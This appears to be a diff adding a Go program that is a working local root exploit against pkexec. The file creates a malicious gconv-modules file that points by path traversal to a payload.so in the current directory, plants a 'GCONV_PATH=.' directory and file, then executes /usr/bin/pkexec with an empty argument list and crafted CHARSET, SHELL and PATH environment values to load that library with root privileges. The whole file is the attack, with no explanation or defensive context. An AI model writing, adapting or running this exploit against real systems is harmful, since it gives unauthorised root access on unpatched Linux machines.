@@ -1,0 +1,52 @@
+package main
+
+import (
+	"fmt"
+	"io/ioutil"
+	"log"
+	"os"
+	"strings"
+	"syscall"
+)
+
+const (
+	fake_charset = "payload"
+	gconv_dir    = "gconv"
+)
+
+var (
+	gconv_content = "module  PAYLOAD//    INTERNAL    ../../../../../../../..${REPLACE}    2\nmodule  INTERNAL    PAYLOAD//    ../../../../../../../..${REPLACE}    2"
+)
+
+func wirte_gconv_module() (err error) {
+	if err := os.Mkdir(gconv_dir, 0o0755); err != nil {
+		return err
+	}
+	directory, err := os.Getwd()
+	if err != nil {
+		return err
+	}
+	replace := directory + "/payload.so"
+	content := strings.Replace(gconv_content, "${REPLACE}", replace, -1)
+	if err := ioutil.WriteFile(fmt.Sprintf("%s/gconv-modules", gconv_dir), []byte(content), 0o0755); err != nil {
+		log.Fatal(err)
+	}
+	return nil
+
+}
+
+func main() {
+	target := "/usr/bin/pkexec"
+	if err := wirte_gconv_module(); err != nil {
+		log.Fatal(err)
+	}
+	if err := os.Mkdir("GCONV_PATH=.", 0o0755); err != nil {
+		log.Fatal(err)
+	}
+	if err := ioutil.WriteFile(fmt.Sprintf("GCONV_PATH=./%s", gconv_dir), []byte("\x00"), 0o0755); err != nil {
+		log.Fatal(err)
+	}
+	if err := syscall.Exec(target, nil, []string{gconv_dir, "PATH=GCONV_PATH=.", "SHELL=/fake/shell", fmt.Sprintf("CHARSET=%s", fake_charset)}); err != nil {
+		log.Fatal(err)
+	}
+}
